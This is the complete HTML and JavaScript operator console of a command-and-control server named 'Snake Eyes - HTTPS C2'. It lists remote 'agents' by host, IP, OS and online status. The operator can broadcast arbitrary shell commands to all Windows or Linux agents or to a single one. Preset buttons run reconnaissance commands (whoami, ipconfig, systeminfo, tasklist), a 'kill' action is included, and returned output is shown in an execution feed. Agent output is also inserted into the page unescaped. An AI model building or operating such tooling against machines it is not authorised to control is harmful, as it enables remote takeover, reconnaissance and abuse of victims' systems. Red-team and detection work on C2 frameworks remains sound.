<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Eyes - HTTPS C2</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root {
            --bg: #000000;
            --panel: #111930;
            --panel-2: #151f3a;
            --text: #e8edff;
            --muted: #9fb0d4;
            --accent: #4de0ff;
            --accent-2: #6dffb5;
            --danger: #ff5b78;
            --warn: #ffc658;
            --line: #2a3a61;
        }

        body {
            background: radial-gradient(circle at 5% -10%, #23376d, transparent 30%), radial-gradient(circle at 95% -20%, #17374a, transparent 35%), var(--bg);
            color: var(--text);
            min-height: 100vh;
            font-family: Inter, Segoe UI, Arial, sans-serif;
            padding: 1rem;
        }

        .shell { max-width: 1800px; margin: 0 auto; }
        .panel {
            background: linear-gradient(180deg, var(--panel), var(--panel-2));
            border: 1px solid var(--line);
            border-radius: 14px;
            padding: 0.9rem;
            box-shadow: 0 8px 30px rgba(0,0,0,.25);
        }

        .brand { color: var(--accent); font-weight: 800; letter-spacing: .03em; text-transform: uppercase; }
        .subtle { color: var(--muted); font-size: .8rem; }

        .kpi {
            border: 1px solid var(--line);
            border-radius: 10px;
            background: #0f1730;
            padding: .55rem .7rem;
            min-width: 130px;
        }
        .kpi .lbl { color: var(--muted); font-size: .66rem; text-transform: uppercase; letter-spacing: .08em; }
        .kpi .val { font-size: 1.15rem; font-weight: 700; }

        .grid { display:grid; grid-template-columns: 1.6fr 1fr; gap:1rem; }
        .table-wrap { border:1px solid var(--line); border-radius:10px; overflow:auto; max-height: 470px; }
        .table { --bs-table-bg: transparent; --bs-table-color: var(--text); margin:0; font-size:.88rem; }
        .table th { color: var(--muted); font-size:.7rem; letter-spacing:.08em; position: sticky; top: 0; background:#121c36; z-index:1; }
        .table td { vertical-align: middle; }

        .chip { border:1px solid var(--line); border-radius:999px; padding:.1rem .45rem; font-size:.66rem; text-transform:uppercase; color: var(--muted); }
        .chip.windows { color:#77c8ff; border-color:#356e9d; }
        .chip.linux { color:#89f9ac; border-color:#36844d; }
        .chip.mac { color:#e0b5ff; border-color:#7e4ea0; }
        .chip.unknown { color:#ffd889; border-color:#8a6b35; }

        .dot { width:10px; height:10px; border-radius:50%; display:inline-block; margin-right:.35rem; }
        .online { background: var(--accent-2); box-shadow: 0 0 10px rgba(109,255,181,.6); }
        .stale { background: var(--warn); }
        .offline { background: var(--danger); }
        .unknown { background: #8c98b8; }

        .terminal {
            background: #0a1226;
            border: 1px solid var(--line);
            border-radius: 10px;
            max-height: 390px;
            overflow-y: auto;
            font-family: Consolas, monospace;
            font-size: .82rem;
            padding: .55rem;
        }
        .item { border:1px solid #22345b; background:#0d1730; border-radius:8px; padding:.5rem; margin-bottom:.45rem; }
        .result-out { white-space: pre-wrap; margin: .3rem 0 0; color: #8dffcf; }
        .selected { box-shadow: inset 3px 0 0 var(--accent); background: rgba(77,224,255,.08) !important; }

        .form-control, .form-select { background:#0d1730; color:var(--text); border-color:#314778; }
        .form-control:focus, .form-select:focus { border-color:var(--accent); box-shadow:0 0 0 .15rem rgba(77,224,255,.2); background:#0d1730; color:var(--text); }
        .btn-outline-c2 { border-color:#3f5b91; color:#b7ccf8; }
        .btn-outline-c2:hover { border-color:var(--accent); color:var(--accent); }

        .chart-box { height:180px; border:1px solid var(--line); border-radius:10px; background:#0d1730; padding:.5rem; }
        canvas { width:100%; height:100%; }

        @media (max-width: 1200px) { .grid { grid-template-columns:1fr; } }
    </style>
</head>
<body>
<div class="shell">
    <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-3">
        <div>
            <h3 class="brand m-0">Snake Eyes - HTTPS C2</h3>
        </div>
        <div class="d-flex gap-2 flex-wrap">
            <div class="kpi"><div class="lbl">Online</div><div class="val" id="k-online">0</div></div>
            <div class="kpi"><div class="lbl">Stale</div><div class="val" id="k-stale">0</div></div>
            <div class="kpi"><div class="lbl">Offline</div><div class="val" id="k-offline">0</div></div>
            <div class="kpi"><div class="lbl">Queue</div><div class="val" id="k-queue">0</div></div>
            <div class="kpi"><div class="lbl">Clock</div><div class="val" id="clock">00:00:00</div></div>
        </div>
    </div>

    <div class="grid">
        <div class="panel">
            <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
                <strong>Asset Inventory</strong>
                <div class="d-flex gap-2 flex-wrap">
                    <input id="agent-search" class="form-control form-control-sm" placeholder="Search host / os / ip" style="width:190px">
                    <select id="agent-os-filter" class="form-select form-select-sm" style="width:140px">
                        <option value="ALL">All OS</option><option value="WINDOWS">Windows</option><option value="LINUX">Linux</option><option value="MAC">Mac</option><option value="UNKNOWN">Unknown</option>
                    </select>
                    <select id="agent-status-filter" class="form-select form-select-sm" style="width:150px">
                        <option value="ALL">All Status</option><option value="ONLINE">Online</option><option value="STALE">Stale</option><option value="OFFLINE">Offline</option><option value="UNKNOWN">Unknown</option>
                    </select>
                </div>
            </div>
            <div class="table-wrap">
                <table class="table table-hover table-sm align-middle">
                    <thead><tr><th>HOST</th><th>OS</th><th>LAST SEEN</th><th>STATUS</th><th>ACTIONS</th></tr></thead>
                    <tbody id="agent-table"></tbody>
                </table>
            </div>
        </div>

        <div class="d-flex flex-column gap-3">
            <div class="panel">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <strong>Queue Monitor</strong>
                    <button class="btn btn-sm btn-outline-danger" onclick="purgeQueue()">Purge</button>
                </div>
                <div id="queue-list" class="terminal"></div>
            </div>
            <div class="panel">
                <div class="d-flex justify-content-between align-items-center mb-2"><strong>Fleet Mix</strong><span class="subtle">OS distribution</span></div>
                <div class="chart-box"><canvas id="os-chart" width="480" height="160"></canvas></div>
            </div>
        </div>
    </div>

    <div class="panel mt-3">
        <strong>Command Uplink</strong>
        <form id="cmd-form" class="mt-2">
            <div class="row g-2 align-items-center">
                <div class="col-lg-3">
                    <select name="target" id="target-select" class="form-select">
                        <option value="ALL">Broadcast All</option>
                        <optgroup label="OS Groups"><option value="BROADCAST_WINDOWS">Windows All</option><option value="BROADCAST_LINUX">Linux All</option></optgroup>
                        <optgroup label="Assets" id="opt-assets"></optgroup>
                    </select>
                </div>
                <div class="col-lg-7"><input type="text" name="command" id="cmd-input" class="form-control" placeholder="Type command..." required></div>
                <div class="col-lg-2 d-grid"><button class="btn btn-success">Send</button></div>
            </div>
            <div class="d-flex gap-2 mt-2 flex-wrap">
                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('whoami')">whoami</button>
                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('ipconfig || ip a')">network</button>
                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('systeminfo || uname -a')">sysinfo</button>
                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('tasklist || ps aux')">processes</button>
            </div>
        </form>
    </div>

    <div class="panel mt-3">
        <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
            <strong>Execution History</strong>
            <div class="d-flex gap-2 flex-wrap">
                <input id="results-search" class="form-control form-control-sm" placeholder="Search output / host" style="width:220px">
                <select id="results-os-filter" class="form-select form-select-sm" style="width:130px">
                    <option value="ALL">All OS</option><option value="WINDOWS">Windows</option><option value="LINUX">Linux</option><option value="MAC">Mac</option><option value="UNKNOWN">Unknown</option>
                </select>
                <select id="results-host-filter" class="form-select form-select-sm" style="width:180px"><option value="ALL">All Hosts</option></select>
            </div>
        </div>
        <div id="results-feed" class="terminal" style="max-height:480px"></div>
    </div>
</div>

<script>
    function osChipClass(family) {
        if (family === 'WINDOWS') return 'windows';
        if (family === 'LINUX') return 'linux';
        if (family === 'MAC') return 'mac';
        return 'unknown';
    }

    function statusClass(status) {
        if (status === 'ONLINE') return 'online';
        if (status === 'STALE') return 'stale';
        if (status === 'OFFLINE') return 'offline';
        return 'unknown';
    }

    function debounce(fn, delay = 260) {
        let t;
        return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), delay); };
    }

    function quickCmd(command) {
        document.getElementById('cmd-input').value = command;
        document.getElementById('cmd-input').focus();
    }

    function getFilters() {
        return {
            agent_search: document.getElementById('agent-search').value.trim(),
            agent_os: document.getElementById('agent-os-filter').value,
            agent_status: document.getElementById('agent-status-filter').value,
            results_search: document.getElementById('results-search').value.trim(),
            results_os: document.getElementById('results-os-filter').value,
            results_host: document.getElementById('results-host-filter').value || 'ALL',
            results_limit: '220'
        };
    }

    function queryString(obj) {
        const params = new URLSearchParams();
        Object.entries(obj).forEach(([k, v]) => { if (v !== '' && v != null) params.set(k, v); });
        return params.toString();
    }

    function selectAgent(hostname) {
        document.getElementById('target-select').value = hostname;
        document.getElementById('cmd-input').focus();
        updateDashboard();
    }

    async function triggerAction(hostname, action) {
        const body = new FormData();
        body.append('hostname', hostname);
        body.append('action', action);
        await fetch('/admin/action', { method: 'POST', body });
        updateDashboard();
    }

    async function purgeQueue() {
        await fetch('/admin/purge_tasks', { method: 'POST' });
        updateDashboard();
    }

    function drawOsChart(stats) {
        const canvas = document.getElementById('os-chart');
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        const parts = [
            { label: 'Windows', key: 'windows_agents', color: '#77c8ff' },
            { label: 'Linux', key: 'linux_agents', color: '#89f9ac' },
            { label: 'Mac', key: 'mac_agents', color: '#ddb0ff' },
            { label: 'Unknown', key: 'unknown_agents', color: '#ffd889' },
        ];

        const total = parts.reduce((sum, p) => sum + (stats[p.key] || 0), 0) || 1;
        let x = 14;
        const y = 35;
        const width = canvas.width - 28;
        const h = 24;

        parts.forEach(p => {
            const w = Math.max(0, ((stats[p.key] || 0) / total) * width);
            ctx.fillStyle = p.color;
            ctx.fillRect(x, y, w, h);
            x += w;
        });

        let ly = 85;
        ctx.font = '12px Inter';
        parts.forEach(p => {
            const count = stats[p.key] || 0;
            ctx.fillStyle = p.color;
            ctx.fillRect(16, ly - 9, 10, 10);
            ctx.fillStyle = '#dbe7ff';
            ctx.fillText(`${p.label}: ${count}`, 32, ly);
            ly += 22;
        });
    }

    function syncHostFilter(hosts) {
        const select = document.getElementById('results-host-filter');
        const prev = select.value || 'ALL';
        select.innerHTML = '<option value="ALL">All Hosts</option>';
        (hosts || []).forEach(h => {
            const o = document.createElement('option');
            o.value = h;
            o.textContent = h;
            select.appendChild(o);
        });
        if ([...select.options].some(o => o.value === prev)) select.value = prev;
    }

    function renderAgents(agents) {
        const table = document.getElementById('agent-table');
        const assets = document.getElementById('opt-assets');
        const current = document.getElementById('target-select').value;
        table.innerHTML = '';
        assets.innerHTML = '';

        if (!agents.length) {
            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match filters.</td></tr>';
            return;
        }

        agents.forEach(a => {
            table.innerHTML += `
                <tr class="${current === a.hostname ? 'selected' : ''}">
                    <td onclick="selectAgent('${a.hostname}')" style="cursor:pointer"><strong>${a.hostname}</strong><div class="subtle">${a.ip || '-'}</div></td>
                    <td><span class="chip ${osChipClass(a.os_family)}">${a.os_family}</span><div class="subtle">${a.os}</div></td>
                    <td>${a.last_seen || '--:--:--'}</td>
                    <td><span class="dot ${statusClass(a.status)}"></span>${a.status}</td>
                    <td>
                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','sysinfo')">INFO</button>
                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','netstat')">NET</button>
                        <button class="btn btn-sm btn-outline-danger" onclick="triggerAction('${a.hostname}','kill')">KILL</button>
                    </td>
                </tr>`;
            assets.innerHTML += `<option value="${a.hostname}">${a.hostname}</option>`;
        });
    }

    function renderQueue(queue) {
        const el = document.getElementById('queue-list');
        if (!queue.length) {
            el.innerHTML = '<div class="text-center text-muted py-4">Queue clear.</div>';
            return;
        }
        el.innerHTML = '';
        queue.forEach(t => {
            const seen = t.seen_list?.length ? t.seen_list.join(', ') : 'none';
            el.innerHTML += `<div class="item"><div><span class="text-warning">#${t.task_id}</span> ${t.target} <span class="subtle">@ ${t.timestamp}</span></div><div>${t.command}</div><div class="subtle">Receipts: ${t.seen_count} (${seen})</div></div>`;
        });
    }

    function renderResults(results) {
        const el = document.getElementById('results-feed');
        if (!results.length) {
            el.innerHTML = '<div class="text-center text-muted py-4">No execution logs for selected filters.</div>';
            return;
        }
        el.innerHTML = '';
        results.forEach(r => {
            el.innerHTML += `<div class="item"><div class="d-flex justify-content-between"><div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div><span class="subtle">${r.timestamp}</span></div><pre class="result-out">${r.output}</pre></div>`;
        });
    }

    async function updateDashboard() {
        try {
            const data = await (await fetch(`/api/stats?${queryString(getFilters())}`)).json();
            const s = data.stats || {};

            document.getElementById('k-online').textContent = s.online_agents || 0;
            document.getElementById('k-stale').textContent = s.stale_agents || 0;
            document.getElementById('k-offline').textContent = s.offline_agents || 0;
            document.getElementById('k-queue').textContent = s.queue_size || 0;

            syncHostFilter(data.filters?.result_hosts || []);
            renderAgents(data.agents || []);
            renderQueue(data.queue || []);
            renderResults(data.results || []);
            drawOsChart(s);
        } catch (err) {
            console.error('Update failed', err);
        }
    }

    const refreshDebounced = debounce(updateDashboard, 220);
    ['agent-search','agent-os-filter','agent-status-filter','results-search','results-os-filter','results-host-filter'].forEach(id => {
        document.getElementById(id).addEventListener('input', refreshDebounced);
        document.getElementById(id).addEventListener('change', refreshDebounced);
    });

    document.getElementById('cmd-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const res = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
        if (res.ok) e.target.reset();
        updateDashboard();
    });

    setInterval(() => { document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
    setInterval(updateDashboard, 3000);
    updateDashboard();
</script>
</body>
</html>
